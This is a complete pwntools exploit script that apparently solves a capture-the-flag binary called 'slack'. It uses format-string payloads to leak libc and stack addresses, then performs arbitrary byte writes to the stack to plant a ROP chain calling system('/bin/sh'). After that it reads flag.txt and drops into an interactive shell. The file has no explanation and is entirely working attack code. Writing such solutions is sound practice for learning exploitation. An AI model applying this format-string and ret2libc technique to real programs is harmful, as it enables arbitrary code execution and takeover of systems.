from pwn import *

if args['REMOTE']:
    r = remote('127.0.0.1', 5000)
else:
    # Binary patched with patchelf to use the right libc
    r = process('./slack_patched')
    input("Attach debugger? ")

def send_receive(r, s):
    r.recvuntil(b'Professional): ')
    assert(len(s) <= 13)
    if len(s) == 13:
        r.send(s)
    else:
        r.sendline(s)
    r.recvuntil(b'You: ')
    return r.recvline()[:-1]

def write_byte(r, addr, b):
    log.info("Redirect stack pointer")
    n = addr & 0xffff
    if n > 0:
        send_receive(r, f'%{n}c%25$hn'.encode())
    else:
        send_receive(r, '%25hn'.encode())
    log.info("Write byte")
    if b > 0:
        send_receive(r, f'%{b}c%55$hhn'.encode())
    else:
        send_receive(r, f'%55$hhn'.encode())

    

log.info("Leak libc and stack pointer")
x = send_receive(r, b'%21$p %25$p')
libc_leak = int(x.split()[0], 16)
log.info(f"libc leak: 0x{libc_leak:x}")
libc = libc_leak - 0x29d90
log.info(f"libc @ 0x{libc:x}")
system = libc + 0x50d70
binsh = libc + 0x1d8678
poprdi = libc + 0x2a3e5
ret = libc + 0x2a3e6
stack_leak = int(x.split()[1], 16)
log.info(f"stack leak: 0x{stack_leak:x}")
ret_addr = stack_leak - 0x110
counter_addr = stack_leak - 0x180

log.info("Make counter very negative")
# We alter the most significant byte to make the counter very negative
write_byte(r, counter_addr + 3, 0x80)

log.info("Writing ROP chain to stack")
# We need an extra ret for stack alignment
rop = p64(poprdi) + p64(binsh) + p64(ret) + p64(system)

for i, b in enumerate(rop):
    write_byte(r, ret_addr + i, b)

log.info("Make counter positive to trigger ROP chain")
write_byte(r, counter_addr + 3, 0)

r.sendline('cat flag.txt'.encode())
r.interactive()
